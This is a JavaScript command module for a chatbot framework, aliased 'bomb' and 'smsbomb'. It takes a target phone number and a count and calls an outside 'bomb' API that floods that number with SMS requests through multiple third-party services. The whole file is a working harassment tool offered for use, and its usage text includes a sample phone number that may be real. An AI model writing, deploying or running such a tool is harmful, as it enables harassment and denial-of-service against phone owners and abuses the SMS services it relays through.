const axios = require("axios");

module.exports = {
  config: {
    name: "sms",
    aliases: ["bomb", "smsbomb"],
    version: "1.0.0",
    author: "frnAlt",
    countDown: 10,
    role: 0,
    category: "tools",
    description: "Send SMS requests to a target phone number using ultra-fast APIs.",
    guide: {
      en: "{pn} <phone_number> [count]\nExample: {pn} 01305057230 1"
    }
  },

  onStart: async function ({ api, event, args, message, commandName }) {
    const prefix = global.GoatBot?.config?.prefix || "!";
    const isReactOff = Boolean(
      global.GoatBot?.reactOff ??
      global.FloppaBot?.reactOff ??
      global.GoatBot?.config?.reactOff ??
      global.FloppaBot?.config?.reactOff
    );

    const safeReact = async (emoji) => {
      if (isReactOff || !api?.setMessageReaction) return;
      try {
        await new Promise(resolve => {
          api.setMessageReaction(emoji, event.messageID, () => resolve(), true);
        });
      } catch (_) {}
    };

    if (!args[0]) {
      return message.reply(
        `📱 Please provide a phone number and count.\n\n` +
        `💡 Usage: ${prefix}${commandName} <number> [count]\n` +
        `💡 Example: ${prefix}${commandName} 01305057230 1`
      );
    }

    const rawPhone = args[0].trim();
    const cleanPhone = rawPhone.replace(/[^0-9]/g, "");

    if (cleanPhone.length < 10 || cleanPhone.length > 15) {
      await safeReact("👎");
      return message.reply("⚠️ Invalid phone number. Please provide a valid 10 to 14 digit phone number.");
    }

    let count = 1;
    if (args[1]) {
      const parsedCount = parseInt(args[1], 10);
      if (!isNaN(parsedCount) && parsedCount > 0) {
        // Cap max count to prevent timeouts or service bans
        count = Math.min(parsedCount, 50);
      }
    }

    await safeReact("⏳");

    try {
      const apiUrl = `https://xalman-apis.vercel.app/api/bomb?phone=${encodeURIComponent(cleanPhone)}&count=${encodeURIComponent(count)}`;
      const res = await axios.get(apiUrl, { timeout: 20000 });

      if (res.data && (res.data.status === true || res.data.message)) {
        await safeReact("👍");

        const totalRequests = res.data.total_requests || count;
        const totalApis = res.data.total_apis || "Multi";
        const mode = res.data.mode || "ULTRA_FAST";

        // Simple output that confirms sending without exposing the target phone number
        return message.reply(
          `👍 SMS requests dispatched successfully!\n\n` +
          `• Count: ${count}\n` +
          `• Total Requests: ${totalRequests}\n` +
          `• Active APIs: ${totalApis}\n` +
          `• Mode: ${mode}\n` +
          `• Status: Process Completed`
        );
      } else {
        throw new Error(res.data?.message || "Service responded with false status.");
      }
    } catch (err) {
      console.error("[SMS COMMAND ERROR]:", err.message || err);
      await safeReact("👎");
      return message.reply(`👎 Failed to send SMS requests: ${err.response?.data?.message || err.message || "Unknown error"}`);
    }
  }
};
